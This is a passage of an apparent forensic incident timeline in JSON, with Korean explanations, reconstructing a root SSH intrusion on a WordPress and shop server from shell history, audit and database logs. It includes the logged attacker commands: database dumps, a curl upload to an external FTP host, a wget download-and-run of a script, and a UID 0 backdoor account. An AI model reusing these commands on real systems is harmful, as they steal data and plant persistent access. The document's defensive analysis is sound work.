pts/1)","kind":"wtmp_login","user":"root","ip":"45.133.1.77","tty":"pts/1","pid":"2213","src":"/var/log/wtmp","line":3,"sid":"S3","note":"wtmp(last 명령이 읽는 파일)에 남은 로그인 기록입니다."},{"ts":1790961260,"cat":"recon","sev":"low","msg":"정찰","cmd":"whoami","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":2,"raw":"whoami\n── audit (/var/log/audit/audit.log:17) ──\ntype=SYSCALL msg=audit(1790961260.000:1207): arch=c000003e syscall=59 success=yes exit=0 ppid=6432 pid=6433 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"whoami\" exe=\"/usr/bin/whoami\" key=(null)\ntype=EXECVE msg=audit(1790961260.000:1207): argc=1 a0=\"whoami\"\ntype=CWD msg=audit(1790961260.000:1207): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961260.000:1207): proctitle=77686F616D69","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["지금 어떤 계정으로 들어와 있는지 확인했습니다. 침입 직후 자기 권한을 파악하는 전형적인 첫 명령입니다."],"details":[],"check":[]}},{"ts":1790961265,"cat":"recon","sev":"low","msg":"정찰","cmd":"id","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":4,"raw":"id\n── audit (/var/log/audit/audit.log:21) ──\ntype=SYSCALL msg=audit(1790961265.000:1208): arch=c000003e syscall=59 success=yes exit=0 ppid=4180 pid=4181 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"id\" exe=\"/usr/bin/id\" key=(null)\ntype=EXECVE msg=audit(1790961265.000:1208): argc=1 a0=\"id\"\ntype=CWD msg=audit(1790961265.000:1208): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961265.000:1208): proctitle=6964","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["현재 계정의 UID와 소속 그룹을 확인했습니다. uid=0 이면 root(최고 관리자) 권한이라는 뜻입니다."],"details":[],"check":[]}},{"ts":1790961271,"cat":"recon","sev":"low","msg":"정찰","cmd":"uname -a","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":6,"raw":"uname -a\n── audit (/var/log/audit/audit.log:25) ──\ntype=SYSCALL msg=audit(1790961271.000:1209): arch=c000003e syscall=59 success=yes exit=0 ppid=7428 pid=7429 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"uname\" exe=\"/usr/bin/uname\" key=(null)\ntype=EXECVE msg=audit(1790961271.000:1209): argc=2 a0=\"uname\" a1=\"-a\"\ntype=CWD msg=audit(1790961271.000:1209): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961271.000:1209): proctitle=756E616D65002D61","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["서버의 커널 버전과 OS 정보를 확인했습니다. 공격자는 이 정보로 쓸 수 있는 권한상승 취약점을 찾습니다."],"details":[],"check":[]}},{"ts":1790961280,"cat":"recon","sev":"low","msg":"정찰","cmd":"cat /etc/passwd","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":8,"raw":"cat /etc/passwd\n── audit (/var/log/audit/audit.log:29) ──\ntype=SYSCALL msg=audit(1790961280.000:1210): arch=c000003e syscall=59 success=yes exit=0 ppid=3963 pid=3964 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"cat\" exe=\"/usr/bin/cat\" key=(null)\ntype=EXECVE msg=audit(1790961280.000:1210): argc=2 a0=\"cat\" a1=\"/etc/passwd\"\ntype=CWD msg=audit(1790961280.000:1210): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961280.000:1210): proctitle=636174002F6574632F706173737764","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["서버에 어떤 계정들이 있는지 목록(/etc/passwd)을 봤습니다. 비밀번호는 들어 있지 않지만 공격할 계정을 고르는 데 쓰입니다."],"details":[],"check":[]}},{"ts":1790961292,"cat":"recon","sev":"low","msg":"정찰","cmd":"ss -tlnp","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":10,"raw":"ss -tlnp\n── audit (/var/log/audit/audit.log:33) ──\ntype=SYSCALL msg=audit(1790961292.000:1211): arch=c000003e syscall=59 success=yes exit=0 ppid=7675 pid=7676 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"ss\" exe=\"/usr/bin/ss\" key=(null)\ntype=EXECVE msg=audit(1790961292.000:1211): argc=2 a0=\"ss\" a1=\"-tlnp\"\ntype=CWD msg=audit(1790961292.000:1211): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961292.000:1211): proctitle=7373002D746C6E70","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["서버에 열려 있는 포트와 그 포트를 쓰는 프로그램을 확인했습니다. DB(3306, 5432) 같은 내부 서비스를 찾는 정찰입니다."],"details":[],"check":[]}},{"ts":1790961310,"cat":"recon","sev":"low","msg":"정찰","cmd":"ps aux | grep -E 'mysql|postgres'","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":12,"raw":"ps aux | grep -E 'mysql|postgres'\n── audit (/var/log/audit/audit.log:37) ──\ntype=SYSCALL msg=audit(1790961310.000:1212): arch=c000003e syscall=59 success=yes exit=0 ppid=5526 pid=5527 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"ps\" exe=\"/usr/bin/ps\" key=(null)\ntype=EXECVE msg=audit(1790961310.000:1212): argc=2 a0=\"ps\" a1=\"aux\"\ntype=CWD msg=audit(1790961310.000:1212): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961310.000:1212): proctitle=707300617578\n── audit (/var/log/audit/audit.log:41) ──\ntype=SYSCALL msg=audit(1790961311.000:1213): arch=c000003e syscall=59 success=yes exit=0 ppid=7588 pid=7589 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"grep\" exe=\"/usr/bin/grep\" key=(null)\ntype=EXECVE msg=audit(1790961311.000:1213): argc=3 a0=\"grep\" a1=\"-E\" a2=\"mysql|postgres\"\ntype=CWD msg=audit(1790961311.000:1213): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961311.000:1213): proctitle=67726570002D45006D7973716C7C706F737467726573","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["실행 중인 프로세스 목록을 봤습니다.","그중 \"mysql 또는 postgres\" 이(가) 들어간 것만 골라 봤습니다. 즉 mysql 또는 postgres 프로그램이 이 서버에서 돌고 있는지 확인한 것입니다."],"details":[],"check":[]}},{"ts":1790961340,"cat":"recon","sev":"high","msg":"자격증명 탐색","cmd":"cat /var/www/html/wp-config.php","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":14,"raw":"cat /var/www/html/wp-config.php\n── audit (/var/log/audit/audit.log:45) ──\ntype=SYSCALL msg=audit(1790961340.000:1214): arch=c000003e syscall=59 success=yes exit=0 ppid=8585 pid=8586 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"cat\" exe=\"/usr/bin/cat\" key=(null)\ntype=EXECVE msg=audit(1790961340.000:1214): argc=2 a0=\"cat\" a1=\"/var/www/html/wp-config.php\"\ntype=CWD msg=audit(1790961340.000:1214): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961340.000:1214): proctitle=636174002F7661722F7777772F68746D6C2F77702D636F6E6669672E706870","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["워드프레스 설정 파일(wp-config.php)을 열어봤습니다. 이 파일에는 DB 접속 계정과 비밀번호가 평문으로 들어 있어서, 공격자가 여기서 DB 비밀번호를 얻었을 가능성이 높습니다."],"details":[],"check":["DB 비밀번호를 바꾸세요."]}},{"ts":1790961390,"cat":"db","sev":"med","msg":"DB 접속","cmd":"mysql -uroot -p'Wp!2024db' -e 'show databases'","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":16,"raw":"mysql -uroot -p'Wp!2024db' -e 'show databases'\n── audit (/var/log/audit/audit.log:49) ──\ntype=SYSCALL msg=audit(1790961390.000:1215): arch=c000003e syscall=59 success=yes exit=0 ppid=4479 pid=4480 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"mysql\" exe=\"/usr/bin/mysql\" key=(null)\ntype=EXECVE msg=audit(1790961390.000:1215): argc=5 a0=\"mysql\" a1=\"-uroot\" a2=\"-pWp!2024db\" a3=\"-e\" a4=73686F7720646174616261736573\ntype=CWD msg=audit(1790961390.000:1215): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961390.000:1215): proctitle=6D7973716C002D75726F6F74002D70577021323032346462002D650073686F7720646174616261736573","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["root 계정으로 MySQL 데이터베이스에 접속했습니다.","접속하자마자 \"show databases\" 를 실행해 서버에 어떤 데이터베이스들이 있는지 목록을 확인했습니다."],"details":[["-pWp!2024db","비밀번호가 명령에 그대로 적혀 있습니다. 공격자가 DB 비밀번호를 이미 알고 있었다는 뜻이고(예: 설정 파일에서 탈취), 이 비밀번호는 노출된 것으로 보고 바꿔야 합니다."]],"check":[]}},{"ts":1790961390.0,"cat":"db","sev":"info","msg":"MySQL 접속: root@localhost","kind":"mysql_conn","user":"root","src":"/var/log/mysql/mysql.log","line":4,"raw":"2026-10-02T17:16:30.000000Z\t   41 Connect\troot@localhost on  using Socket","tags":["MySQL general log","세션 시간대로 추정"],"sid":"S3","ip":"45.133.1.77","ip_inferred":true,"note":"DB 서버 접속 기록입니다. 같은 시각의 SSH 세션과 함께 보면 누가 접속했는지 알 수 있습니다."},{"ts":1790961482,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"mkdir -p /tmp/.x","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":18,"raw":"mkdir -p /tmp/.x\n── audit (/var/log/audit/audit.log:53) ──\ntype=SYSCALL msg=audit(1790961482.000:1216): arch=c000003e syscall=59 success=yes exit=0 ppid=3843 pid=3844 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"mkdir\" exe=\"/usr/bin/mkdir\" key=(null)\ntype=EXECVE msg=audit(1790961482.000:1216): argc=3 a0=\"mkdir\" a1=\"-p\" a2=\"/tmp/.x\"\ntype=CWD msg=audit(1790961482.000:1216): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961482.000:1216): proctitle=6D6B646972002D70002F746D702F2E78","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["/tmp/.x 폴더를 만들었습니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":[]}},{"ts":1790961495,"cat":"db","sev":"crit","msg":"DB 덤프","cmd":"mysqldump -uroot -p'Wp!2024db' --all-databases | gzip > /tmp/.x/db.sql.gz","user":"root","via":"history","tags":["셸 히스토리","압축·스테이징","auditd 확인"],"src":"/root/.bash_history","line":20,"raw":"mysqldump -uroot -p'Wp!2024db' --all-databases | gzip > /tmp/.x/db.sql.gz\n── audit (/var/log/audit/audit.log:57) ──\ntype=SYSCALL msg=audit(1790961495.000:1217): arch=c000003e syscall=59 success=yes exit=0 ppid=7763 pid=7764 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"mysqldump\" exe=\"/usr/bin/mysqldump\" key=(null)\ntype=EXECVE msg=audit(1790961495.000:1217): argc=4 a0=\"mysqldump\" a1=\"-uroot\" a2=\"-pWp!2024db\" a3=\"--all-databases\"\ntype=CWD msg=audit(1790961495.000:1217): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961495.000:1217): proctitle=6D7973716C64756D70002D75726F6F74002D70577021323032346462002D2D616C6C2D646174616261736573\n── audit (/var/log/audit/audit.log:61) ──\ntype=SYSCALL msg=audit(1790961496.000:1218): arch=c000003e syscall=59 success=yes exit=0 ppid=7678 pid=7679 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"gzip\" exe=\"/usr/bin/gzip\" key=(null)\ntype=EXECVE msg=audit(1790961496.000:1218): argc=1 a0=\"gzip\"\ntype=CWD msg=audit(1790961496.000:1218): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961496.000:1218): proctitle=677A6970","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["MySQL 에 root 계정으로 접속해 모든 데이터베이스를 통째로 뽑아냈습니다(DB 덤프). 결과는 SQL 문장 형태의 텍스트로, 테이블 구조와 데이터가 전부 들어 있습니다.","그 결과를 압축해서 /tmp/.x/db.sql.gz 파일로 저장했습니다."],"details":[["-pWp!2024db","비밀번호가 명령에 그대로 적혀 있습니다. 공격자가 DB 비밀번호를 이미 알고 있었다는 뜻이고(예: 설정 파일에서 탈취), 이 비밀번호는 노출된 것으로 보고 바꿔야 합니다."]],"check":["덤프된 DB 에 개인정보·결제정보가 있다면 유출 신고 대상인지 검토하세요."]}},{"ts":1790961496.0,"cat":"db","sev":"info","msg":"MySQL 접속: root@localhost","kind":"mysql_conn","user":"root","src":"/var/log/mysql/mysql.log","line":8,"raw":"2026-10-02T17:18:16.000000Z\t   42 Connect\troot@localhost on  using Socket","tags":["MySQL general log","세션 시간대로 추정"],"sid":"S3","ip":"45.133.1.77","ip_inferred":true,"note":"DB 서버 접속 기록입니다. 같은 시각의 SSH 세션과 함께 보면 누가 접속했는지 알 수 있습니다."},{"ts":1790961496.0,"cat":"db","sev":"crit","msg":"mysqldump 덤프 패턴 감지 — 테이블 9개 (wordpress, shop)","kind":"mysql_dump","user":"root","cmd":"wp_options, wp_posts, wp_users, wp_usermeta, wp_comments, customers, orders, payments, coupons","src":"/var/log/mysql/mysql.log","line":8,"raw":"2026-10-02T17:18:16.000000Z\t   42 Connect\troot@localhost on  using Socket\n2026-10-02T17:18:16.000000Z\t   42 Query\t/*!40100 SET @@SQL_MODE='' */\n2026-10-02T17:18:16.000000Z\t   42 Query\t/*!40103 SET TIME_ZONE='+00:00' */\n2026-10-02T17:18:16.000000Z\t   42 Query\tSET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\n2026-10-02T17:18:16.000000Z\t   42 Query\tSTART TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */\n2026-10-02T17:18:17.000000Z\t   42 Init DB\twordpress\n2026-10-02T17:18:17.000000Z\t   42 Query\tSHOW CREATE TABLE `wp_options`\n2026-10-02T17:18:17.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `wp_options`\n2026-10-02T17:18:40.000000Z\t   42 Query\tSHOW CREATE TABLE `wp_posts`\n2026-10-02T17:18:40.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `wp_posts`\n2026-10-02T17:18:59.000000Z\t   42 Query\tSHOW CREATE TABLE `wp_users`\n2026-10-02T17:18:59.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `wp_users`\n2026-10-02T17:19:15.000000Z\t   42 Query\tSHOW CREATE TABLE `wp_usermeta`\n2026-10-02T17:19:15.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `wp_usermeta`\n2026-10-02T17:19:29.000000Z\t   42 Query\tSHOW CREATE TABLE `wp_comments`\n2026-10-02T17:19:29.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `wp_comments`\n2026-10-02T17:19:41.000000Z\t   42 Init DB\tshop\n2026-10-02T17:19:41.000000Z\t   42 Query\tSHOW CREATE TABLE `customers`\n2026-10-02T17:19:41.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `customers`\n2026-10-02T17:20:11.000000Z\t   42 Query\tSHOW CREATE TABLE `orders`\n2026-10-02T17:20:11.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `orders`\n2026-10-02T17:20:21.000000Z\t   42 Query\tSHOW CREATE TABLE `payments`\n2026-10-02T17:20:21.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `payments`\n2026-10-02T17:20:48.000000Z\t   42 Query\tSHOW CREATE TABLE `coupons`\n2026-10-02T17:20:48.000000Z\t   42 Query\tSELECT /*!40001 SQL_NO_CACHE */ * FROM `coupons`\n2026-10-02T17:21:17.000000Z\t   42 Quit\t","tags":["MySQL general log","conn 42","세션 시간대로 추정"],"sid":"S3","ip":"45.133.1.77","ip_inferred":true,"note":"mysqldump 는 테이블마다 \"SELECT /*!40001 SQL_NO_CACHE */ * FROM 테이블\" 을 보내 데이터를 꺼냅니다. DB 로그에 이 패턴이 연속으로 찍혔다는 것은 아래 테이블들이 통째로 복사됐다는 뜻입니다."},{"ts":1790961760,"cat":"db","sev":"crit","msg":"DB 덤프","cmd":"sudo -u postgres pg_dump crm > /tmp/.x/crm.sql","user":"root","via":"history","tags":["셸 히스토리","권한 상승","sudo 로그 확인","실행계정=postgres","auditd 확인"],"src":"/root/.bash_history","line":22,"raw":"sudo -u postgres pg_dump crm > /tmp/.x/crm.sql\n── sudo (/var/log/auth.log:77) ──\nOct  3 02:22:40 web01 sudo[2290]:     root : TTY=pts/1 ; PWD=/root ; USER=postgres ; COMMAND=/usr/bin/pg_dump crm\n── audit (/var/log/audit/audit.log:65) ──\ntype=SYSCALL msg=audit(1790961760.000:1219): arch=c000003e syscall=59 success=yes exit=0 ppid=8232 pid=8233 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"sudo\" exe=\"/usr/bin/sudo\" key=(null)\ntype=EXECVE msg=audit(1790961760.000:1219): argc=5 a0=\"sudo\" a1=\"-u\" a2=\"postgres\" a3=\"pg_dump\" a4=\"crm\"\ntype=CWD msg=audit(1790961760.000:1219): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961760.000:1219): proctitle=7375646F002D7500706F7374677265730070675F64756D700063726D\n── audit (/var/log/audit/audit.log:69) ──\ntype=SYSCALL msg=audit(1790961761.000:1220): arch=c000003e syscall=59 success=yes exit=0 ppid=4538 pid=4539 auid=0 uid=105 gid=0 euid=105 tty=pts1 ses=5 comm=\"pg_dump\" exe=\"/usr/bin/pg_dump\" key=(null)\ntype=EXECVE msg=audit(1790961761.000:1220): argc=2 a0=\"pg_dump\" a1=\"crm\"\ntype=CWD msg=audit(1790961761.000:1220): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961761.000:1220): proctitle=70675F64756D700063726D","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["PostgreSQL 의 crm 데이터베이스 전체를 뽑아냈습니다(DB 덤프).","결과를 /tmp/.x/crm.sql 파일로 저장했습니다."],"details":[["sudo -u postgres","postgres 계정 권한으로 실행했습니다."]],"check":["덤프된 DB 에 개인정보가 있다면 유출 신고 대상인지 검토하세요."]}},{"ts":1790961761.083,"cat":"db","sev":"info","msg":"PostgreSQL 접속: postgres → crm (pg_dump)","kind":"pg_conn","user":"postgres","src":"/var/log/postgresql/postgresql-16-main.log","line":2,"raw":"2026-10-03 02:22:41.083 KST [3120] postgres@crm LOG:  connection authorized: user=postgres database=crm application_name=pg_dump","tags":["PostgreSQL 로그","세션 시간대로 추정"],"sid":"S3","ip":"45.133.1.77","ip_inferred":true,"note":"DB 서버 접속 기록입니다. 같은 시각의 SSH 세션과 함께 보면 누가 접속했는지 알 수 있습니다."},{"ts":1790961761.083,"cat":"db","sev":"crit","msg":"PostgreSQL 덤프 감지 — pg_dump 실행, 테이블 4개 (DB crm)","kind":"pg_dump","user":"postgres","cmd":"public.customers, public.contacts, public.deals, public.invoices","src":"/var/log/postgresql/postgresql-16-main.log","line":1,"raw":"2026-10-03 02:22:41.249 KST [3120] [unknown]@[unknown] LOG:  connection received: host=[local]\n2026-10-03 02:22:41.083 KST [3120] postgres@crm LOG:  connection authorized: user=postgres database=crm application_name=pg_dump\n2026-10-03 02:22:44.588 KST [3120] postgres@crm LOG:  statement: COPY public.customers (id, name, email, phone, created_at) TO stdout;\n2026-10-03 02:22:44.307 KST [3120] postgres@crm LOG:  statement: COPY public.contacts (id, name, email, phone, created_at) TO stdout;\n2026-10-03 02:22:44.537 KST [3120] postgres@crm LOG:  statement: COPY public.deals (id, name, email, phone, created_at) TO stdout;\n2026-10-03 02:22:44.506 KST [3120] postgres@crm LOG:  statement: COPY public.invoices (id, name, email, phone, created_at) TO stdout;\n2026-10-03 02:23:30.896 KST [3120] postgres@crm LOG:  disconnection: session time: 0:00:49.102 user=postgres database=crm host=[local]","tags":["PostgreSQL 로그","pid 3120","세션 시간대로 추정"],"sid":"S3","ip":"45.133.1.77","ip_inferred":true,"note":"pg_dump 는 \"COPY 테이블 TO stdout\" 으로 테이블 데이터를 통째로 꺼냅니다. 아래 테이블들이 복사됐습니다."},{"ts":1790961845,"cat":"cmd","sev":"low","msg":"압축·스테이징","cmd":"tar czf /tmp/.x/www.tgz /var/www/html","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":24,"raw":"tar czf /tmp/.x/www.tgz /var/www/html\n── audit (/var/log/audit/audit.log:73) ──\ntype=SYSCALL msg=audit(1790961845.000:1221): arch=c000003e syscall=59 success=yes exit=0 ppid=6049 pid=6050 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"tar\" exe=\"/usr/bin/tar\" key=(null)\ntype=EXECVE msg=audit(1790961845.000:1221): argc=4 a0=\"tar\" a1=\"czf\" a2=\"/tmp/.x/www.tgz\" a3=\"/var/www/html\"\ntype=CWD msg=audit(1790961845.000:1221): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961845.000:1221): proctitle=74617200637A66002F746D702F2E782F7777772E74677A002F7661722F7777772F68746D6C","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["/var/www/html 를 /tmp/.x/www.tgz 하나로 묶어 압축했습니다. 밖으로 빼내기 전에 자료를 한 파일로 모으는 단계에서 자주 보입니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":[]}},{"ts":1790961846.0,"cat":"cmd","sev":"low","msg":"압축·스테이징","cmd":"gzip","user":"root","via":"audit","tags":["auditd"],"src":"/var/log/audit/audit.log","line":77,"raw":"type=SYSCALL msg=audit(1790961846.000:1222): arch=c000003e syscall=59 success=yes exit=0 ppid=3797 pid=3798 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"gzip\" exe=\"/usr/bin/gzip\" key=(null)\ntype=EXECVE msg=audit(1790961846.000:1222): argc=1 a0=\"gzip\"\ntype=CWD msg=audit(1790961846.000:1222): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961846.000:1222): proctitle=677A6970","ses":"5","pid":"3798","cwd":"/root","exe":"/usr/bin/gzip","sid":"S3","ip":"45.133.1.77","explain":{"summary":["데이터를 압축했습니다. (다른 명령에 딸려 자동으로 실행된 압축 단계일 수 있습니다)"],"details":[],"check":[]}},{"ts":1790961930,"cat":"transfer","sev":"crit","msg":"curl 업로드 (외부 유출)","cmd":"curl -T /tmp/.x/db.sql.gz ftp://185.220.101.4/up/ --user anon:anon","user":"root","via":"history","tags":["셸 히스토리","파일 전송","auditd 확인"],"src":"/root/.bash_history","line":26,"raw":"curl -T /tmp/.x/db.sql.gz ftp://185.220.101.4/up/ --user anon:anon\n── audit (/var/log/audit/audit.log:81) ──\ntype=SYSCALL msg=audit(1790961930.000:1223): arch=c000003e syscall=59 success=yes exit=0 ppid=7486 pid=7487 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"curl\" exe=\"/usr/bin/curl\" key=(null)\ntype=EXECVE msg=audit(1790961930.000:1223): argc=6 a0=\"curl\" a1=\"-T\" a2=\"/tmp/.x/db.sql.gz\" a3=\"ftp://185.220.101.4/up/\" a4=\"--user\" a5=\"anon:anon\"\ntype=CWD msg=audit(1790961930.000:1223): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790961930.000:1223): proctitle=6375726C002D54002F746D702F2E782F64622E73716C2E677A006674703A2F2F3138352E3232302E3130312E342F75702F002D2D7573657200616E6F6E3A616E6F6E","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["이 서버의 /tmp/.x/db.sql.gz 파일을 외부 서버(185.220.101.4)로 업로드했습니다. 서버의 데이터가 밖으로 나간 것(유출)입니다."],"details":[["--user","상대 서버에 anon 계정으로 로그인했습니다."],["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":["185.220.101.4 주소를 차단하고, 업로드된 파일에 무엇이 들어 있었는지 확인하세요."]}},{"ts":1790962020,"cat":"transfer","sev":"high","msg":"외부 파일 다운로드","cmd":"wget -q http://185.220.101.4/k.sh -O /tmp/.x/k.sh","user":"root","via":"history","tags":["셸 히스토리","파일 전송","auditd 확인"],"src":"/root/.bash_history","line":28,"raw":"wget -q http://185.220.101.4/k.sh -O /tmp/.x/k.sh\n── audit (/var/log/audit/audit.log:85) ──\ntype=SYSCALL msg=audit(1790962020.000:1224): arch=c000003e syscall=59 success=yes exit=0 ppid=8832 pid=8833 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"wget\" exe=\"/usr/bin/wget\" key=(null)\ntype=EXECVE msg=audit(1790962020.000:1224): argc=5 a0=\"wget\" a1=\"-q\" a2=\"http://185.220.101.4/k.sh\" a3=\"-O\" a4=\"/tmp/.x/k.sh\"\ntype=CWD msg=audit(1790962020.000:1224): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962020.000:1224): proctitle=77676574002D7100687474703A2F2F3138352E3232302E3130312E342F6B2E7368002D4F002F746D702F2E782F6B2E7368\n── audit (/var/log/audit/audit.log:93) ──\ntype=SYSCALL msg=audit(1790962035.000:1226): arch=c000003e syscall=59 success=yes exit=0 ppid=7622 pid=7623 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"k.sh\" exe=\"/tmp/.x/k.sh\" key=(null)\ntype=EXECVE msg=audit(1790962035.000:1226): argc=1 a0=\"/tmp/.x/k.sh\"\ntype=CWD msg=audit(1790962035.000:1226): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962035.000:1226): proctitle=2F746D702F2E782F6B2E7368","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["외부 서버(185.220.101.4)에서 파일을 내려받았습니다(→ /tmp/.x/k.sh 로 저장)."],"details":[["-q","진행 상황을 출력하지 않도록 조용히 받았습니다."],["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":["185.220.101.4 주소를 차단하고, 내려받은 파일을 확보해 분석하세요."]}},{"ts":1790962030,"cat":"exec","sev":"high","msg":"악성 실행 의심","cmd":"chmod +x /tmp/.x/k.sh","user":"root","via":"history","tags":["셸 히스토리","auditd 확인"],"src":"/root/.bash_history","line":30,"raw":"chmod +x /tmp/.x/k.sh\n── audit (/var/log/audit/audit.log:89) ──\ntype=SYSCALL msg=audit(1790962030.000:1225): arch=c000003e syscall=59 success=yes exit=0 ppid=3513 pid=3514 auid=0 uid=0 gid=0 euid=0 tty=pts1 ses=5 comm=\"chmod\" exe=\"/usr/bin/chmod\" key=(null)\ntype=EXECVE msg=audit(1790962030.000:1225): argc=3 a0=\"chmod\" a1=\"+x\" a2=\"/tmp/.x/k.sh\"\ntype=CWD msg=audit(1790962030.000:1225): cwd=\"/root\"\ntype=PROCTITLE msg=audit(1790962030.000:1225): proctitle=63686D6F64002B78002F746D702F2E782F6B2E7368","ses":"5","sid":"S3","ip":"45.133.1.77","explain":{"summary":["/tmp/.x/k.sh 에 실행 권한을 줬습니다. 방금 받아온 파일을 실행하려는 준비 단계입니다."],"details":[["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":[]}},{"ts":1790962035,"cat":"exec","sev":"high","msg":"악성 실행 의심","cmd":"nohup /tmp/.x/k.sh >/dev/null 2>&1 &","user":"root","via":"history","tags":["셸 히스토리"],"src":"/root/.bash_history","line":32,"raw":"nohup /tmp/.x/k.sh >/dev/null 2>&1 &","sid":"S3","ip":"45.133.1.77","explain":{"summary":["/tmp/.x/k.sh 프로그램을 직접 실행했습니다. 기본 프로그램이 아니라 따로 가져다 놓은 파일입니다."],"details":[["nohup … &","접속을 끊어도 프로그램이 계속 돌아가도록 백그라운드로 실행했습니다."],[">/dev/null","출력(이나 오류 메시지)을 버려 화면에 흔적이 남지 않게 했습니다."],["/tmp/.x","점(.)으로 시작하는 이름은 ls 로 잘 안 보이는 숨김 폴더·파일입니다. 공격자가 작업 공간으로 자주 씁니다."]],"check":["/tmp/.x/k.sh 파일을 확보해 분석하고, ps 로 아직 실행 중인지 확인하세요."]}},{"ts":1790962120.0,"cat":"persist","sev":"crit","msg":"UID 0 백도어 계정 생성: sysupd","kind":"acct","target":"sysupd","host":"web01","src":"/var/log/auth.log","line":79,"raw":"Oct  3 02:28:40 web01 useradd[2301]: new user: name=sysupd, UID=0, GID=0, home=/home/sysupd, shell=/bin/bash, from=/dev/pts/1","pid":"2301","sid":"S3","ip":"45.133.1.77","ip_inferred":true,"tags":["세션 시간대로 추정"],"note":"UID 0 은 root 와 같은 최고 권한입니다. root 가 아닌 이름의 UID 0 계정은 대표적인 